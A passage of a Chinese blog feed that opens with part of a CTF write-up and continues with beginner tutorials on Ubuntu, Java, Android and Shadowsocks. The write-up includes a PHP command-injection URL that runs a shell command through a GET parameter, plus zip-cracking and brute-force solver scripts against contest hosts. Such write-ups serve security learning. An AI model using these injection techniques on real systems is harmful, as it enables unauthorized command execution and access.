+<p>因為這題 <code>.htaccess</code> 沒有限制，所以可以直接訪問 <code>flag</code></p>
+<pre><code>http://104.199.235.135:31333/flag_name_1s_t00_l0ng_QAQQQQQQ
+</code></pre></li>
+<li>
+<p>不過如果有限制，可以利用下面的解法來印出 <code>flag</code></p>
+<pre><code>http://104.199.235.135:31333/?🍣=&quot;.`$_GET[1]`.&quot;&amp;1=cat flag_name_1s_t00_l0ng_QAQQQQQQ
+</code></pre></li>
+</ol>
+<h2 id="reverse">Reverse</h2>
+<h3 id="1-find">1. find</h3>
+<p>這題只是將 <code>flag</code> 藏在檔案中，可以用記事本或是編輯器打開，用 <code>ctrl+f</code> 很快就能找到了。</p>
+<ol>
+<li>如果是用 linux 或 mac 有更快的解法
+<img src="https://i.imgur.com/70zIglq.png" alt=""></li>
+</ol>
+<h3 id="3-crackme">3. crackme</h3>
+<ol>
+<li>
+<p>猜測這是用 .NET 寫的，所以用 <a href="https://github.com/0xd4d/dnSpy">dnSpy</a> 來打開它</p>
+</li>
+<li>
+<p>在 <code>MainWindow</code> 中看到疑似 <code>flag</code> 的東西
+<img src="https://i.imgur.com/9eywW9l.png" alt=""></p>
+</li>
+<li>
+<p>發現 <code>secret</code> 是用 XOR 加密然後轉成 int
+<img src="https://i.imgur.com/jy0YJuo.png" alt=""></p>
+</li>
+<li>
+<p>用 Python 來解</p>
+<pre><code class="language-python=" data-lang="python=">#!/usr/bin/env python3
+list = [234, 226, 248, 152, 208, 154, 223, 244, 226, 158, 244, 238, 234, 216, 210, 244, 223, 228, 244, 232, 249, 159, 200, 192, 244, 230, 206, 138, 214]
+for i in list:
+    print(chr(i^171), end='')   
+</code></pre></li>
+</ol>
+<h2 id="misc">Misc</h2>
+<h3 id="1-welcome">1. welcome</h3>
+<p>送分題，看影片拿 flag</p>
+<h3 id="2-flags">2. flags</h3>
+<p>這題可以找到 3 個假 <code>flag</code>，要找到真 <code>flag</code> 根本要通靈＝＝</p>
+<ol>
+<li>
+<p>用編輯器開他，會發現有假 <code>flag</code> 藏在其中</p>
+</li>
+<li>
+<p>將檔名改成 jpg，會看到圖片上面顯示著假 <code>flag</code>
+<img src="https://i.imgur.com/kZBhDwS.jpg" alt=""></p>
+</li>
+<li>
+<p>用 <code>binwalk</code> 去分析檔案，會發現其中藏著 zip
+<img src="https://i.imgur.com/uIHBkQb.png" alt=""></p>
+</li>
+<li>
+<p>用 dd 把其中的 zip 拆出來</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dd <span style="color:#66d9ef">if</span><span style="color:#f92672">=</span>flags.jpg of<span style="color:#f92672">=</span>flag skip<span style="color:#f92672">=</span><span style="color:#ae81ff">48932</span> bs<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</code></pre></div></li>
+<li>
+<p>拆出來的 zip 有密碼，所以用 <code>pkcrack</code> 來破解</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pkcrack -c backup/Avengers_Infinity_War_Poster.jpg -p Avengers_Infinity_War_Poster.jpg -C flag.zip -P photo.zip
+</code></pre></div></li>
+<li>
+<p>破解完後拿到裡面的 <code>flag</code> 檔，發現還是假的＝＝</p>
+</li>
+<li>
+<p>最後透過主辦方給出的提示，回到第二步那張圖，盯了老半天，發現那個框框藏有<strong>摩斯密碼</strong>&hellip;
+<img src="https://i.imgur.com/kZBhDwS.jpg" alt=""></p>
+</li>
+</ol>
+<h2 id="crypto">Crypto</h2>
+<h3 id="1-pow">1. POW</h3>
+<p>這題考的就是 <code>proof of work</code></p>
+<ol>
+<li>用 Python 暴力去運算比對是否符合條件
+<pre><code class="language-python=" data-lang="python=">#!/usr/bin/env python3
+import itertools
+import string
+from hashlib import *
+from pwn import *
+
+r = remote('104.199.235.135', 20000)
+r.recvuntil(&quot;condition : x[:6] == '&quot;)
+cond = r.recvuntil(&quot;'&quot;).decode('ascii').rstrip(&quot;'&quot;)
+r.recvuntil('x = ')
+ans = ''
+alphanumeric = string.ascii_uppercase + string.ascii_lowercase + string.digits
+for s in itertools.product(alphanumeric, repeat=4):
+    if sha256(('%s%s'%(cond, ''.join(s))).encode('utf-8')).hexdigest().startswith('000000'):
+        ans = cond + ''.join(s)
+        break
+r.sendline(ans)
+r.interactive()
+</code></pre></li>
+</ol>]]></content></item><item><title>在 Ubuntu 上安裝中文輸入法</title><link>https://blackmaple.me/%E5%9C%A8ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/</link><pubDate>Tue, 04 Sep 2018 23:39:33 +0000</pubDate><guid>https://blackmaple.me/%E5%9C%A8ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/</guid><description>&lt;ol>
+&lt;li>點擊「系統設定值」的按鈕
+&lt;img src="https://i.imgur.com/8weBEw1.jpg" alt="">&lt;/li>
+&lt;/ol></description><content type="html"><![CDATA[<ol>
+<li>點擊「系統設定值」的按鈕
+<img src="https://i.imgur.com/8weBEw1.jpg" alt=""></li>
+</ol>
+<ol start="2">
+<li>
+<p>點擊「語言支援」
+<img src="https://i.imgur.com/QC1VYHK.jpg" alt=""></p>
+</li>
+<li>
+<p>第一次打開，會跳出「安裝語言尚未支援完備」，這邊點擊「安裝」
+<img src="https://i.imgur.com/ovNfLFq.jpg" alt=""></p>
+</li>
+<li>
+<p>這邊會讓你輸入你剛剛設定的密碼，並等待安裝完畢
+<img src="https://i.imgur.com/Ja9Ovqj.jpg" alt=""></p>
+</li>
+<li>
+<p>安裝完後重新開機
+<img src="https://i.imgur.com/omw1N1Z.jpg" alt=""></p>
+</li>
+<li>
+<p>開機完後點右上角的鍵盤圖示，然後點選「ConfigureFcitx」
+<img src="https://i.imgur.com/FWRbEQr.jpg" alt=""></p>
+</li>
+<li>
+<p>點選左下角的「＋」來新增輸入法
+<img src="https://i.imgur.com/nzGCa1U.jpg" alt=""></p>
+</li>
+<li>
+<p>這邊推薦安裝「新酷音」
+<img src="https://i.imgur.com/L5HrnOT.jpg" alt=""></p>
+</li>
+<li>
+<p>安裝完後可以在輸入法列表裡看到你剛剛選擇的輸入法，這邊可以調整輸入法順序
+<img src="https://i.imgur.com/vqiw8Yx.jpg" alt=""></p>
+</li>
+</ol>]]></content></item><item><title>使用 Parallels Desktop Lite 安裝 Ubuntu 16.04（macOS）</title><link>https://blackmaple.me/%E4%BD%BF%E7%94%A8-parallels-desktop-lite-%E5%AE%89%E8%A3%9D-ubuntu-16-04macos/</link><pubDate>Tue, 04 Sep 2018 23:36:13 +0000</pubDate><guid>https://blackmaple.me/%E4%BD%BF%E7%94%A8-parallels-desktop-lite-%E5%AE%89%E8%A3%9D-ubuntu-16-04macos/</guid><description>&lt;h2 id="安裝-parallels-desktop-lite">安裝 Parallels Desktop Lite&lt;/h2>
+&lt;p>到 &lt;a href="https://itunes.apple.com/tw/app/parallels-desktop-lite/id1085114709">Mac App Store&lt;/a> 上面可以找到&lt;/p></description><content type="html"><![CDATA[<h2 id="安裝-parallels-desktop-lite">安裝 Parallels Desktop Lite</h2>
+<p>到 <a href="https://itunes.apple.com/tw/app/parallels-desktop-lite/id1085114709">Mac App Store</a> 上面可以找到</p>
+<h2 id="安裝-ubuntu-1604">安裝 Ubuntu 16.04</h2>
+<ol>
+<li>
+<p>開啟 Parallels Desktop Lite
+<img src="https://i.imgur.com/FZgYScy.jpg" alt=""></p>
+</li>
+<li>
+<p>安裝 Ubuntu
+<img src="https://i.imgur.com/NP5rFfy.png" alt=""></p>
+</li>
+<li>
+<p>選取你下載的 Ubuntu 映像檔，並點擊<strong>繼續</strong>
+<img src="https://i.imgur.com/A6Gl0Si.png" alt=""></p>
+</li>
+<li>
+<p>取消勾選『快速安裝』，並點擊<strong>繼續</strong>
+<img src="https://i.imgur.com/OvO4OMw.png" alt=""></p>
+</li>
+<li>
+<p>勾選安裝前設定，可以社設定虛擬機配置
+<img src="https://i.imgur.com/DUoG0ug.png" alt=""></p>
+</li>
+<li>
+<p>點擊配置已設定虛擬機，然後點擊<strong>繼續</strong>來開始安裝
+<img src="https://i.imgur.com/ET2tcHM.png" alt=""></p>
+</li>
+<li>
+<p>選擇語言
+<img src="https://i.imgur.com/oQNjwG8.png" alt=""></p>
+</li>
+<li>
+<p>選擇「安裝 Ubuntu」（如果想先試用，但不安裝，可以點第一項）
+<img src="https://i.imgur.com/0Fs3tId.png" alt=""></p>
+</li>
+<li>
+<p>選擇安裝過程的語言
+<img src="https://i.imgur.com/on5qjbI.jpg" alt=""></p>
+</li>
+<li>
+<p>建議全部勾選，也可以選擇自己想要的勾選
+<img src="https://i.imgur.com/xMeVUEq.jpg" alt=""></p>
+</li>
+<li>
+<p>如果是在虛擬機中安裝，不需分隔磁碟，直接選第一個，然後按「立即安裝」
+<img src="https://i.imgur.com/18mN5pS.jpg" alt=""></p>
+</li>
+<li>
+<p>點擊「繼續」開始安裝
+<img src="https://i.imgur.com/2fEiSDD.jpg" alt=""></p>
+</li>
+<li>
+<p>選擇時區
+<img src="https://i.imgur.com/vMKPjPe.jpg" alt=""></p>
+</li>
+<li>
+<p>選擇鍵盤排列方試（台灣鍵盤為美式鍵盤）
+<img src="https://i.imgur.com/S8Ey4nw.jpg" alt=""></p>
+</li>
+<li>
+<p>輸入使用者帳戶資訊
+<img src="https://i.imgur.com/HyVXVes.jpg" alt=""></p>
+</li>
+<li>
+<p>等待安裝並重新開機</p>
+</li>
+</ol>
+<blockquote>
+<p>註：如果重新開機失敗，可以點選下圖的重新啟動
+<img src="https://i.imgur.com/UD95Mls.jpg" alt=""></p>
+</blockquote>
+<h2 id="parellels-解析度調整">Parellels 解析度調整</h2>
+<ol>
+<li>
+<p>重新開機後，點擊 Parallels 上方的操作選單，並點擊安裝 Parallels Tools，依照指示完成安裝。
+<img src="https://i.imgur.com/GSC8SsF.jpg" alt=""></p>
+</li>
+<li>
+<p>確認螢幕設定為「縮放」
+<img src="https://i.imgur.com/7YMXx9t.jpg" alt=""></p>
+</li>
+<li>
+<p>點擊「系統設定值」的按鈕
+<img src="https://i.imgur.com/Cd293Gd.jpg" alt=""></p>
+</li>
+<li>
+<p>點擊「顯示器」
+<img src="https://i.imgur.com/vuFY6F5.jpg" alt=""></p>
+</li>
+<li>
+<p>在這裡可以調整螢幕的解析度（Macbook 建議調成 1440x900）
+<img src="https://i.imgur.com/S9YBeTE.jpg" alt=""></p>
+</li>
+</ol>]]></content></item><item><title>條件式與迴圈 - Java</title><link>https://blackmaple.me/%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%88%87%E8%BF%B4%E5%9C%88-java/</link><pubDate>Wed, 14 Mar 2018 02:04:41 +0000</pubDate><guid>https://blackmaple.me/%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%88%87%E8%BF%B4%E5%9C%88-java/</guid><description>&lt;p>為了告訴電腦特定條件下該做什麼動作，要使用各種條件式來定義程式執行的流程。&lt;/p>
+&lt;h2 id="條件式">條件式&lt;/h2>
+&lt;p>「如果OOO成立，就要…」，Java提供了 &lt;code>if...else&lt;/code> 條件式，語法如下：&lt;/p></description><content type="html"><![CDATA[<p>為了告訴電腦特定條件下該做什麼動作，要使用各種條件式來定義程式執行的流程。</p>
+<h2 id="條件式">條件式</h2>
+<p>「如果OOO成立，就要…」，Java提供了 <code>if...else</code> 條件式，語法如下：</p>
+<h3 id="ifelse">if&hellip;else</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>條件式一<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    陳述句<span style="color:#f92672">;</span>  
+<span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>條件式二<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+    陳述句<span style="color:#f92672">;</span>
+<span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+    陳述句<span style="color:#f92672">;</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>條件式運算結果為 <code>true</code> 會執行 <code>if</code> 的 <code>{</code> 與 <code>}</code> 中的陳述句，否則執行下一個條件式，如果所有條件是都不符合，則執行 <code>else</code> 的 <code>{</code> 與 <code>}</code> 中的陳述句，如果條件式不成立時並不想作任何事，則 <code>else</code> 可以省略。</p>
+<h3 id="switch">switch</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">switch</span> <span style="color:#f92672">(</span>變數或運算式<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>   
+    <span style="color:#66d9ef">case</span> 整數<span style="color:#960050;background-color:#1e0010">、</span>字元<span style="color:#960050;background-color:#1e0010">、</span>字串<span style="color:#f92672">:</span>   
+        陳述句<span style="color:#f92672">;</span>   
+        <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>   
+    <span style="color:#66d9ef">case</span> 整數<span style="color:#960050;background-color:#1e0010">、</span>字元<span style="color:#960050;background-color:#1e0010">、</span>字串<span style="color:#f92672">:</span>   
+        陳述句<span style="color:#f92672">;</span>   
+        <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>   
+    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>   
+        陳述句<span style="color:#f92672">;</span>   
+<span style="color:#f92672">}</span>
+</code></pre></div><p>首先看看 <code>switch</code> 的括號，當中置放要取得值的變數或運算式，值必須是整數、字元、字串，取得值後會開始與 <code>case</code> 中設定的整數、字元、字串比對，如果符合就執行之後的陳述句，直到遇到 <code>break</code>，則離開 <code>switch</code> 區塊，如果沒有符合的整數、字元、字串，則會執行 <code>default</code> 後的陳述句，<code>default</code> 不一定需要，如果沒有預設要處理的動作，可以省略 <code>default</code>。</p>
+<h2 id="迴圈">迴圈</h2>
+<p>在 Java 中如果要進行重複性指令執行，可以使用 for 迴圈式或 while 迴圈</p>
+<h3 id="for">for</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>初始式<span style="color:#f92672">;</span> 執行結果必須是boolean的重複式<span style="color:#f92672">;</span> 重複式<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>  
+    陳述句<span style="color:#f92672">;</span>   
+<span style="color:#f92672">}</span>
+</code></pre></div><h3 id="while">while</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>條件式<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>  
+    陳述句<span style="color:#f92672">;</span>   
+<span style="color:#f92672">}</span>
+</code></pre></div><h3 id="dowhile">do&hellip;while</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">do</span> <span style="color:#f92672">{</span>   
+    陳述句<span style="color:#f92672">;</span>   
+<span style="color:#f92672">}</span> <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>條件式<span style="color:#f92672">);</span>
+</code></pre></div><h3 id="break">break</h3>
+<p>跳出迴圈</p>
+<h3 id="continue">continue</h3>
+<p>進行下一次迴圈</p>]]></content></item><item><title>型態、變數與運算子 - Java</title><link>https://blackmaple.me/%E5%9E%8B%E6%85%8B%E8%AE%8A%E6%95%B8%E8%88%87%E9%81%8B%E7%AE%97%E5%AD%90-java/</link><pubDate>Mon, 05 Mar 2018 01:11:35 +0000</pubDate><guid>https://blackmaple.me/%E5%9E%8B%E6%85%8B%E8%AE%8A%E6%95%B8%E8%88%87%E9%81%8B%E7%AE%97%E5%AD%90-java/</guid><description>&lt;h2 id="資料型態">資料型態&lt;/h2>
+&lt;h3 id="何謂資料型態">何謂資料型態？&lt;/h3>
+&lt;p>程式儲存資料的型態&lt;/p></description><content type="html"><![CDATA[<h2 id="資料型態">資料型態</h2>
+<h3 id="何謂資料型態">何謂資料型態？</h3>
+<p>程式儲存資料的型態</p>
+<h3 id="認識資料型態">認識資料型態</h3>
+<p>常常聽到別人提到 Java 是物件導向語言，不過 Java 本身並不是純綷的物件導向語言，像是就型態系統而言，Java 就並非每個值都是物件，而是混合了兩個型態系統：<strong>基本型態（Primitive type）<strong>與</strong>物件型態（Object type）</strong>。</p>
+<h3 id="基本型態primitive-type">基本型態（Primitive type）</h3>
+<p>在 Java 語言中有八種<strong>基本型態( Primitive Type )</strong>，可分作四個大類</p>
+<ul>
+<li>整數型態：byte、short、int、long</li>
+<li>浮點數型態：float、double</li>
+<li>字元型態：char</li>
+<li>邏輯型態：boolean</li>
+</ul>
+<h3 id="整數型態">整數型態</h3>
+<p>用於儲存整數</p>
+<table>
+<thead>
+<tr>
+<th>型態</th>
+<th>長度</th>
+<th>範圍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>byte</td>
+<td>8 bits</td>
+<td>−2^7^到2^7^−1</td>
+</tr>
+<tr>
+<td>short</td>
+<td>16 bits</td>
+<td>−2^15^到2^15^−1</td>
+</tr>
+<tr>
+<td>int</td>
+<td>32 bits</td>
+<td>−2^31^到2^31^−1</td>
+</tr>
+<tr>
+<td>long</td>
+<td>64 bits</td>
+<td>−2^63^到2^63^−1</td>
+</tr>
+</tbody>
+</table>
+<h3 id="浮點數型態">浮點數型態</h3>
+<p>用於儲存小數，<code>double</code>浮點數使用的記憶體空間比<code>float</code>浮點數來得多，可表示的精確度也比較大。想要了解確切的範圍，可以自行Google</p>
+<table>
+<thead>
+<tr>
+<th>型態</th>
+<th>長度</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>float</td>
+<td>32 bits</td>
+</tr>
+<tr>
+<td>double</td>
+<td>64 bits</td>
+</tr>
+</tbody>
+</table>
+<h3 id="字元型態">字元型態</h3>
+<p><code>char</code>型態用來儲存<code>'A'</code>、<code>'B'</code>、<code>'林'</code>等字元符號。每個字元型態佔兩個位元組，中文字元與英文字元在Java中同樣都是用兩個位元組儲存。</p>
+<h3 id="布林型態">布林型態</h3>
+<p><code>boolean</code>型態可儲存<code>true</code>與<code>false</code>，分別代表邏輯的「真」與「假」。</p>
+<h2 id="變數">變數</h2>
+<p>不懂變數概念的可以參考這篇，https://openhome.cc/Gossip/Java/Variable.html</p>
+<h3 id="變數命名規則">變數命名規則</h3>
+<p>類別以英文大寫字母開頭，若有多個英文單字組成，採取大寫駝峰型 (upper camel case)</p>
+<ul>
+<li>SampleItem</li>
+<li>MyData</li>
+<li>MySimpleThread</li>
+<li>MainActivity</li>
+</ul>
+<p>方法或變數（包括參數、屬性等）以英文小寫字母開頭，若有多個英文單字組成，採取小寫駝峰型 (lower camel case)</p>
+<ul>
+<li>setUpNetworking</li>
+<li>getView</li>
+<li>myActivity</li>
+</ul>
+<h2 id="運算子">運算子</h2>
+<h3 id="單元運算子">單元運算子</h3>
+<table>
+<thead>
+<tr>
+<th>運算子</th>
+<th>功能</th>
+<th>範例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>+</td>
+<td>正</td>
+<td>+a</td>
+</tr>
+<tr>
+<td>-</td>
+<td>負</td>
+<td>-a</td>
+</tr>
+<tr>
+<td>++</td>
+<td>遞增</td>
+<td>++a, a++</td>
+</tr>
+<tr>
+<td>--</td>
+<td>遞減</td>
+<td>--a, a--</td>
+</tr>
+<tr>
+<td>!</td>
+<td>反轉</td>
+<td>!a</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">boolean</span> a <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">;</span>
+<span style="color:#66d9ef">boolean</span> b <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>a<span style="color:#f92672">;</span>    <span style="color:#75715e">// b 會等於 false
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">boolean</span> c <span style="color:#f92672">=</span> <span style="color:#f92672">!</span>b<span style="color:#f92672">;</span>    <span style="color:#75715e">// c 會等於 true
+</span></code></pre></div><h3 id="一般運算子">一般運算子</h3>
+<p>下面為一般運算子，皆須結合兩個運算元，可用在<code>整數</code>及<code>浮點數</code>，計算結果為整數或浮點數</p>
+<table>
+<thead>
+<tr>
+<th>運算子</th>
+<th>功能</th>
+<th>範例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>+</td>
+<td>加</td>
+<td>a + b</td>
+</tr>
+<tr>
+<td>-</td>
+<td>減</td>
+<td>a - b</td>
+</tr>
+<tr>
+<td>*</td>
+<td>乘</td>
+<td>a * b</td>
+</tr>
+<tr>
+<td>/</td>
+<td>除</td>
+<td>a / b</td>
+</tr>
+<tr>
+<td>%</td>
+<td>取餘數</td>
+<td>a % b</td>
+</tr>
+</tbody>
+</table>
+<h3 id="關係運算子">關係運算子</h3>
+<p>下面為關係運算子，計算結果不是<code>true</code>就是<code>false</code></p>
+<table>
+<thead>
+<tr>
+<th>運算子</th>
+<th>功能</th>
+<th>範例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>==</td>
+<td>相等</td>
+<td>a == b</td>
+</tr>
+<tr>
+<td>!=</td>
+<td>不相等</td>
+<td>a != b</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>大於</td>
+<td>a &gt; b</td>
+</tr>
+<tr>
+<td>&gt;=</td>
+<td>大於等於</td>
+<td>a &gt;= b</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>小於</td>
+<td>a &lt; b</td>
+</tr>
+<tr>
+<td>&lt;=</td>
+<td>小於等於</td>
+<td>a &lt;= b</td>
+</tr>
+</tbody>
+</table>
+<h3 id="指派運算子">指派運算子</h3>
+<table>
+<thead>
+<tr>
+<th>運算子</th>
+<th>功能</th>
+<th>範例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>=</td>
+<td>指派</td>
+<td>a = b</td>
+</tr>
+<tr>
+<td>+=</td>
+<td>相加同時指派</td>
+<td>a += b</td>
+</tr>
+<tr>
+<td>-=</td>
+<td>相減同時指派</td>
+<td>a -= b</td>
+</tr>
+<tr>
+<td>*=</td>
+<td>相乘同時指派</td>
+<td>a *= b</td>
+</tr>
+<tr>
+<td>/=</td>
+<td>相除同時指派</td>
+<td>a /= b</td>
+</tr>
+<tr>
+<td>%=</td>
+<td>取餘數同時指派</td>
+<td>a %= b</td>
+</tr>
+</tbody>
+</table>]]></content></item><item><title>Android 學習問題紀錄</title><link>https://blackmaple.me/android-%E5%AD%B8%E7%BF%92%E5%95%8F%E9%A1%8C%E7%B4%80%E9%8C%84/</link><pubDate>Wed, 28 Feb 2018 14:46:05 +0000</pubDate><guid>https://blackmaple.me/android-%E5%AD%B8%E7%BF%92%E5%95%8F%E9%A1%8C%E7%B4%80%E9%8C%84/</guid><description>&lt;h2 id="紀錄-1">紀錄 1&lt;/h2>
+&lt;h3 id="問題">問題&lt;/h3>
+&lt;p>在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。
+&lt;/p></description><content type="html"><![CDATA[<h2 id="紀錄-1">紀錄 1</h2>
+<h3 id="問題">問題</h3>
+<p>在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。
+</p>
+<h3 id="原因">原因</h3>
+<p>OkHttp 不是執行在 UI Thread，但 Retrofit 是。</p>
+<h2 id="紀錄-2">紀錄 2</h2>
+<h3 id="問題-1">問題</h3>
+<p>在 OkHttp  的 onResponse 中使用 Toast 會噴錯。</p>
+<h3 id="原因-1">原因</h3>
+<p>OkHttp 不是執行在 UI Thread。</p>
+<h3 id="解法">解法</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">// 解法1
+</span><span style="color:#75715e"></span>Handler handler <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Handler<span style="color:#f92672">(</span>Looper<span style="color:#f92672">.</span><span style="color:#a6e22e">getMainLooper</span><span style="color:#f92672">());</span>
+handler<span style="color:#f92672">.</span><span style="color:#a6e22e">post</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Runnable<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#a6e22e">@Override</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        <span style="color:#75715e">// TODO
+</span><span style="color:#75715e"></span>    <span style="color:#f92672">}</span>
+<span style="color:#f92672">});</span>
+<span style="color:#75715e">// 解法2
+</span><span style="color:#75715e"></span>activity<span style="color:#f92672">.</span><span style="color:#a6e22e">runOnUiThread</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Runnable<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#a6e22e">@Override</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">});</span>
+</code></pre></div>]]></content></item><item><title>Mac 下使用 Shadowsocks 翻牆</title><link>https://blackmaple.me/mac%E4%B8%8B%E4%BD%BF%E7%94%A8shadowsocks%E7%BF%BB%E7%89%86/</link><pubDate>Sat, 20 Jan 2018 15:45:09 +0000</pubDate><guid>https://blackmaple.me/mac%E4%B8%8B%E4%BD%BF%E7%94%A8shadowsocks%E7%BF%BB%E7%89%86/</guid><description>這邊教大家如何使用 ShadowsocksX-NG 來進行 Shadowsocks 代理，以達到 翻牆 效果。
+下載 ShadowsocksX-NG GitHub 載點：https://github.com/shadowsocks/ShadowsocksX-NG/releases/
+編輯代理伺服器 點擊「紙飛機」選擇「Server」，然後點擊【Server Preferences&amp;hellip;】選項：
+新增 Shadowsocks 服務配置：
+更改代理模式 預設模式為 Proxy Auto Configure Mode，這邊我們將它改為 Global Mode，使所有對外連線都使用 Shadowsocks，且無需特別設定。
+如要使用 Proxy Auto Configure Mode，會需要額外設定，這邊就不多做敘述。
+測試是否成功 訪問 orange.tw 來查看自己的 IP 是否有變更。
+關閉 Shadowsocks 點擊【Turn Shadowsocks Off】來關閉 Shadowsocks。</description><content type="html"><![CDATA[<p>這邊教大家如何使用 ShadowsocksX-NG 來進行 Shadowsocks 代理，以達到 <strong>翻牆</strong> 效果。</p>
+<!-- raw HTML omitted -->
+<h2 id="下載-shadowsocksx-ng">下載 ShadowsocksX-NG</h2>
+<p>GitHub 載點：https://github.com/shadowsocks/ShadowsocksX-NG/releases/</p>
+<p><img src="https://imgur.com/rputoJL.png" alt=""></p>
+<h2 id="編輯代理伺服器">編輯代理伺服器</h2>
+<p>點擊「紙飛機」選擇「Server」，然後點擊【Server Preferences&hellip;】選項：</p>
+<p><img src="https://i.imgur.com/PjwfSrC.png" alt=""></p>
+<p>新增 Shadowsocks 服務配置：</p>
+<p><img src="https://i.imgur.com/BQM68VU.png" alt=""></p>
+<h2 id="更改代理模式">更改代理模式</h2>
+<p>預設模式為 <code>Proxy Auto Configure Mode</code>，這邊我們將它改為 <code>Global Mode</code>，使所有對外連線都使用 <code>Shadowsocks</code>，且無需特別設定。</p>
+<p>如要使用 <code>Proxy Auto Configure Mode</code>，會需要額外設定，這邊就不多做敘述。</p>
+<p><img src="https://i.imgur.com/FnjA0Up.png" alt=""></p>
+<h2 id="測試是否成功">測試是否成功</h2>
+<p>訪問 <code>orange.tw</code> 來查看自己的 IP 是否有變更。</p>
+<p><img src="https://i.imgur.com/5q9MBsg.png" alt=""></p>
+<h2 id="關閉-shadowsocks">關閉 Shadowsocks</h2>
+<p>點擊【Turn Shadowsocks Off】來關閉 Shadowsocks。</p>
+<p><img src="https://imgur.com/k4WvIRT.png" alt=""></p>
+]]></content></item><item><title>android:gravity 和 android:layout_gravity 的差別</title><link>https://blackmaple.me/android-gravity%E5%92%8Candroid-layout-gravity%E7%9A%84%E5%B7%AE%E5%88%A5/</link><pubDate>Sat, 20 Jan 2018 15:01:10 +0000</pubDate><guid>https://blackmaple.me/android-gravity%E5%92%8Candroid-layout-gravity%E7%9A%84%E5%B7%AE%E5%88%A5/</guid><description>&lt;p>在 Android 介面設計中，常會用到 android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。&lt;/p></description><content type="html"><![CDATA[<p>在 Android 介面設計中，常會用到  android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。</p>
+<p><code>android:gravity</code> 是作用在 view 裡的內容．比如一個 button 上面的 text。你可以設置該 text 在 view 裡是靠左、靠右等位置。</p>
